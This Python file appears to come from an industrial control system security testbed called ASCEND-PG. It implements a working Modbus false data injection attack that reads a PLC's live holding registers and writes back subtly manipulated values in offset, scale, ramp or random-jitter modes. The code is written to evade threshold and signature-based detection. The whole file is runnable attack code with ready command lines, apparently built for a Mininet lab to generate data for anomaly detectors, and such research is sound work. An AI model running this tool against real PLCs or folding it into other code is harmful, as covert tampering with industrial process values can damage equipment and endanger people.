#!/usr/bin/env python3
"""
ASCEND-PG attacks/complex_response_injection.py

Complex Response Injection (MITRE ATT&CK for ICS: T0836 — Modify Parameter).
Part of the False Data Injection (FDI) taxonomy from Morris & Gao (2013).

OVERVIEW:
Complex response injection is an advanced False Data Injection technique.
Instead of injecting constant out-of-range values that simple thresholding
can flag immediately (see naive_response_injection.py), this attack first
reads the authentic CURRENT state of holding registers from the target PLC,
then computes and writes back subtly manipulated, plausible-looking values.

Because the injected values closely track legitimate process dynamics,
they easily bypass static threshold checks and signature-based IDSs,
requiring temporal or physics-aware anomaly detectors (e.g. LSTM, Autoencoders,
DVS metric monitors) to detect.

MANIPULATION MODES:
  1. offset : Adds a constant offset to current reading (e.g., +50 or -50).
  2. scale  : Multiplies current reading by a scaling factor (e.g., 1.15 = +15%).
  3. ramp   : Gradually increases/decreases values over time (simulates drift).
  4. random : Injects bounded random noise/jitter within a percentage band.

USAGE:
    # Scale injection: multiply register 0 by 1.15 every 1s for 10s:
    python3 attacks/complex_response_injection.py --target 10.0.0.1 --address 0 --mode scale --magnitude 1.15 --duration 10.0

    # Fixed offset (+50) injection on register 0:
    python3 attacks/complex_response_injection.py --target 10.0.0.1 --address 0 --mode offset --magnitude 50 --duration 10.0

    # Gradual ramp drift (+5 units/step) across 3 registers:
    python3 attacks/complex_response_injection.py --target 10.0.0.1 --address 0 --count 3 --mode ramp --magnitude 5.0 --duration 15.0

    # Random noise (+/-5% band) on register 0:
    python3 attacks/complex_response_injection.py --target 10.0.0.1 --address 0 --mode random --magnitude 0.05 --duration 10.0

Run this ON THE ATTACKER HOST inside the Mininet topology (e.g., 10.0.0.66).
"""

import argparse
import json
import logging
import random
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

# Shared event log store — repo data/ dir, anchored to this file (attacks/ ->
# repo root) so a standalone run resolves the same path the cycle runner uses.
DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
MODBUS_PORT = 502
TECHNIQUE_ID = "T0836"

# Default magnitudes per manipulation mode if not specified on CLI
DEFAULT_MAGNITUDES = {
    "offset": 50.0,
    "scale": 1.15,
    "ramp": 5.0,
    "random": 0.05,
}

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("complex_response_injection")


def log_event(log_path: Path, event: dict) -> None:
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def clamp_to_uint16(val: float | int) -> int:
    """Clamp calculated value to valid Modbus 16-bit unsigned register range [0, 65535]."""
    return max(0, min(65535, int(round(val))))


def calculate_injected_value(
    original_val: int,
    mode: str,
    magnitude: float,
    step_index: int,
) -> int:
    """Compute the manipulated register value based on the chosen injection mode.

    Args:
        original_val: The authentic register reading directly read from the PLC.
        mode: Manipulation strategy ('offset', 'scale', 'ramp', 'random').
        magnitude: The strength/scale factor of the manipulation.
        step_index: Sequential step counter (1, 2, 3...) for ramp drift accumulation.
    """
    if mode == "offset":
        return clamp_to_uint16(original_val + magnitude)
    elif mode == "scale":
        return clamp_to_uint16(original_val * magnitude)
    elif mode == "ramp":
        drift = magnitude * step_index
        return clamp_to_uint16(original_val + drift)
    elif mode == "random":
        # If magnitude <= 1.0, treat as fraction/percentage band (e.g. 0.05 = +/-5%)
        # If magnitude > 1.0, treat as absolute noise range (+/- magnitude)
        if abs(magnitude) <= 1.0:
            jitter_fraction = random.uniform(-abs(magnitude), abs(magnitude))
            return clamp_to_uint16(original_val * (1.0 + jitter_fraction))
        else:
            jitter_abs = random.uniform(-abs(magnitude), abs(magnitude))
            return clamp_to_uint16(original_val + jitter_abs)
    else:
        log.warning("Unknown mode '%s', falling back to offset", mode)
        return clamp_to_uint16(original_val + magnitude)


def run_complex_injection(
    target_ip: str,
    port: int = MODBUS_PORT,
    address: int = 0,
    count: int = 1,
    mode: str = "offset",
    magnitude: float | None = None,
    duration: float = 10.0,
    interval: float = 1.0,
    device_id: int = 1,
    log_path: Path = DEFAULT_LOG,
) -> dict:
    """Execute complex response injection against the target PLC.

    Performs read-modify-write cycles on target holding registers. Reads authentic
    live values, applies the chosen manipulation mode, and writes drifted values.
    """
    if magnitude is None:
        magnitude = DEFAULT_MAGNITUDES.get(mode, 50.0)

    client = ModbusTcpClient(target_ip, port=port, timeout=3)
    log.info(
        "Connecting to target PLC %s:%d (address=%d, count=%d, mode=%s, magnitude=%.3f, duration=%.1fs, interval=%.1fs)...",
        target_ip,
        port,
        address,
        count,
        mode,
        magnitude,
        duration,
        interval,
    )

    if not client.connect():
        error_msg = f"Could not connect to target {target_ip}:{port}"
        log.error(error_msg)
        log_event(
            log_path,
            {
                "stage": "attack",
                "technique": TECHNIQUE_ID,
                "action": "complex_injection_error",
                "target": target_ip,
                "mode": mode,
                "error": error_msg,
                "success": False,
            },
        )
        return {
            "target": target_ip,
            "mode": mode,
            "cycles_attempted": 0,
            "cycles_succeeded": 0,
            "cycles_failed": 1,
            "success": False,
        }

    cycles_attempted = 0
    cycles_succeeded = 0
    cycles_failed = 0
    start_time = time.time()
    end_time = start_time + duration if duration > 0 else start_time

    try:
        while True:
            cycles_attempted += 1

            # Step 1: Read CURRENT live holding register values
            read_result = client.read_holding_registers(
                address=address,
                count=count,
                device_id=device_id,
            )

            if read_result.isError():
                cycles_failed += 1
                log.warning(
                    "Read holding registers failed on %s:%d (addr=%d, count=%d): %s",
                    target_ip,
                    port,
                    address,
                    count,
                    read_result,
                )
                log_event(
                    log_path,
                    {
                        "stage": "attack",
                        "technique": TECHNIQUE_ID,
                        "action": "complex_injection_read_error",
                        "target": target_ip,
                        "address": address,
                        "count": count,
                        "mode": mode,
                        "error": str(read_result),
                        "success": False,
                    },
                )
            else:
                orig_values = list(read_result.registers)

                # Step 2: Apply realistic-but-drifted manipulation
                injected_values = [
                    calculate_injected_value(
                        original_val=val,
                        mode=mode,
                        magnitude=magnitude,
                        step_index=cycles_attempted,
                    )
                    for val in orig_values
                ]

                # Step 3: Write modified values back to holding registers
                if count == 1:
                    write_result = client.write_register(
                        address=address,
                        value=injected_values[0],
                        device_id=device_id,
                    )
                else:
                    write_result = client.write_registers(
                        address=address,
                        values=injected_values,
                        device_id=device_id,
                    )

                orig_logged = orig_values[0] if count == 1 else orig_values
                inj_logged = injected_values[0] if count == 1 else injected_values

                if write_result.isError():
                    cycles_failed += 1
                    log.warning(
                        "Complex injection write #%d failed on %s:%d: %s",
                        cycles_attempted,
                        target_ip,
                        port,
                        write_result,
                    )
                    log_event(
                        log_path,
                        {
                            "stage": "attack",
                            "technique": TECHNIQUE_ID,
                            "action": "complex_injection",
                            "target": target_ip,
                            "address": address,
                            "count": count,
                            "mode": mode,
                            "magnitude": magnitude,
                            "original_value": orig_logged,
                            "injected_value": inj_logged,
                            "error": str(write_result),
                            "success": False,
                        },
                    )
                else:
                    cycles_succeeded += 1
                    log.info(
                        "Complex injection #%d SUCCESS [%s]: %s:%d reg[%d..%d] orig=%s -> injected=%s",
                        cycles_attempted,
                        mode,
                        target_ip,
                        port,
                        address,
                        address + count - 1,
                        orig_logged,
                        inj_logged,
                    )
                    log_event(
                        log_path,
                        {
                            "stage": "attack",
                            "technique": TECHNIQUE_ID,
                            "action": "complex_injection",
                            "target": target_ip,
                            "address": address,
                            "count": count,
                            "mode": mode,
                            "magnitude": magnitude,
                            "original_value": orig_logged,
                            "injected_value": inj_logged,
                            "success": True,
                        },
                    )

            if duration <= 0 or time.time() >= end_time:
                break

            time.sleep(interval)

    finally:
        client.close()

    log.info(
        "Complex injection finished (%s mode): %d attempted, %d succeeded, %d failed",
        mode,
        cycles_attempted,
        cycles_succeeded,
        cycles_failed,
    )
    return {
        "target": target_ip,
        "mode": mode,
        "magnitude": magnitude,
        "cycles_attempted": cycles_attempted,
        "cycles_succeeded": cycles_succeeded,
        "cycles_failed": cycles_failed,
        "success": cycles_succeeded > 0,
    }


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Complex Response Injection Attack (MITRE T0836)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target PLC IP address (e.g., 10.0.0.1)",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=MODBUS_PORT,
        help="Target Modbus TCP port",
    )
    parser.add_argument(
        "-a",
        "--address",
        type=int,
        default=0,
        help="Starting holding register address (0-based)",
    )
    parser.add_argument(
        "-c",
        "--count",
        type=int,
        default=1,
        help="Number of contiguous registers to manipulate",
    )
    parser.add_argument(
        "-m",
        "--mode",
        type=str,
        default="offset",
        choices=["offset", "scale", "ramp", "random"],
        help="Manipulation mode (offset, scale, ramp, random)",
    )
    parser.add_argument(
        "--magnitude",
        type=float,
        default=None,
        help="Magnitude of manipulation (default: 50 for offset, 1.15 for scale, 5.0 for ramp, 0.05 for random)",
    )
    parser.add_argument(
        "-d",
        "--duration",
        type=float,
        default=10.0,
        help="Duration in seconds to sustain the injection (0 for single read-modify-write cycle)",
    )
    parser.add_argument(
        "-i",
        "--interval",
        type=float,
        default=1.0,
        help="Seconds between read-modify-write injection cycles",
    )
    parser.add_argument(
        "-u",
        "--unit",
        type=int,
        default=1,
        help="Modbus unit / device ID",
    )
    parser.add_argument(
        "--log",
        default=str(DEFAULT_LOG),
        help="Path to the shared event log store (defaults to <repo>/data/log_store.json)",
    )
    args = parser.parse_args()

    log_path = Path(args.log)
    run_complex_injection(
        target_ip=args.target,
        port=args.port,
        address=args.address,
        count=args.count,
        mode=args.mode,
        magnitude=args.magnitude,
        duration=args.duration,
        interval=args.interval,
        device_id=args.unit,
        log_path=log_path,
    )


if __name__ == "__main__":
    main()
